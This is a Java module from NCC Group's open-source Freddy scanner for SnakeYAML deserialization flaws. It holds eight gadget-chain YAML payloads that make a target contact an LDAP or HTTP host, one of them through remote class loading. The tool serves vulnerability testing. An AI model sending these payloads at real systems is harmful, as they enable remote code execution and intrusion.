// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the Java SnakeYAML library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class SnakeYAMLModule extends FreddyModuleBase {
    //C3P0RefDataSource payload data
    private static final String C3P0REF_PREFIX = "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n  jndiName: \"";
    private static final String C3P0REF_SUFFIX = "\"\n  loginTimeout: 0\n";

    //CommonsConfiguration payload data
    private static final String CC_PREFIX = "set:\n  ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \"";
    private static final String CC_SUFFIX = "\"]]\n";

    //JdbcRowSet payload data
    private static final String JDBC_PREFIX = "!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: \"";
    private static final String JDBC_SUFFIX = "\"\n  autoCommit: true\n";

    //ResourceGadget payload data
    private static final String RG_PREFIX = "[!!org.eclipse.jetty.plus.jndi.Resource [\"__/obj\", !!javax.naming.Reference [\"foo\", \"Freddy\", \"";
    private static final String RG_SUFFIX = "\"]], !!org.eclipse.jetty.plus.jndi.Resource [\"obj/test\", !!java.lang.Object []]]\n";

    //ScriptEngine payload data
    private static final String SE_PREFIX = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"";
    private static final String SE_SUFFIX = "\"]]]]\n";

    //SpringAbstractBeanFactory payload data
    private static final String SABF_PREFIX = "set:\n  ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\n    adviceBeanName: \"";
    private static final String SABF_MIDDLE = "\"\n    beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n      shareableResources: [\"";
    private static final String SABF_SUFFIX = "\"]\n  ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []\n";

    //SpringPropertyPathFactory payload data
    private static final String SPPF_PREFIX = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n  targetBeanName: \"";
    private static final String SPPF_MIDDLE = "\"\n  propertyPath: foo\n  beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n    shareableResources: [\"";
    private static final String SPPF_SUFFIX = "\"]\n";

    //XBean payload data
    private static final String XBEAN_PREFIX = "!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\"foo\", !!javax.naming.Reference [foo, \"Freddy\", \"";
    private static final String XBEAN_SUFFIX = "\"], !!org.apache.xbean.naming.context.WritableContext []]]\n";

    protected void initialiseModule() {
        setName("SnakeYAML");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("exception", Pattern.CASE_INSENSITIVE), Pattern.compile("org\\.yaml\\.snakeyaml")}, IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("'", "found unexpected end of stream");

        registerActiveScanCollaboratorPayload(PN_C3P0RDS, false);
        registerActiveScanCollaboratorPayload(PN_COMMONSCONFIG, false);
        registerActiveScanCollaboratorPayload(PN_JDBC, false);
        registerActiveScanCollaboratorPayload(PN_RESOURCE, false);
        registerActiveScanCollaboratorPayload(PN_SCRIPT, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, false);
        registerActiveScanCollaboratorPayload(PN_XBEAN, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0RDS:
                return C3P0REF_PREFIX + "ldap://" + hostname + "/" + C3P0REF_SUFFIX;

            case PN_COMMONSCONFIG:
                return CC_PREFIX + "ldap://" + hostname + "/" + CC_SUFFIX;

            case PN_JDBC:
                return JDBC_PREFIX + "ldap://" + hostname + "/" + JDBC_SUFFIX;

            case PN_RESOURCE:
                return RG_PREFIX + "http://" + hostname + "/" + RG_SUFFIX;

            case PN_SCRIPT:
                return SE_PREFIX + "http://" + hostname + "/" + SE_SUFFIX;

            case PN_SPRINGABF:
                return SABF_PREFIX + "ldap://" + hostname + "/" + SABF_MIDDLE + "ldap://" + hostname + "/" + SABF_SUFFIX;

            case PN_SPRINGPPF:
                return SPPF_PREFIX + "ldap://" + hostname + "/" + SPPF_MIDDLE + "ldap://" + hostname + "/" + SPPF_SUFFIX;

            case PN_XBEAN:
                return XBEAN_PREFIX + "http://" + hostname + "/" + XBEAN_SUFFIX;
        }
        return null;
    }
}
